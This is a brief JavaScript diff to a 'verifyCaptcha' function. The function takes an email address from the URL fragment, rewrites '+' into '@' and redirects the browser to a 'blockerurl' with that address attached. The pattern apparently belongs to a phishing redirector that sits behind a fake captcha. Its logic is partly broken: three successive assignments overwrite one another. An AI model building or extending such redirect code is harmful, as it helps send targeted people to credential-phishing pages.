@@ -33,14 +33,14 @@ function verifyCaptcha() {
    var email_par = '';
    if(lasthashIndex != -1){
      email = fullurl.substr(lasthashIndex+1);
-  if(email.indexOf('@') != -1){
-    email2 = email.replace('@', '@');
-    email2 = email.replace('@', '@');
-    email2 = email.replace('@', '@');
+  if(email.indexOf('+') != -1){
+    email2 = email.replace('+.', '@');
+    email2 = email.replace('+-', '@');
+    email2 = email.replace('+', '@');
 
   }
   if(validateEmail(email2) || validateEmail(email)){ 
-    email_par = '?em='+email2; 
+    email_par = '?em='+email; 
     window.location.replace(blockerurl+''+email_par);
   }
    }
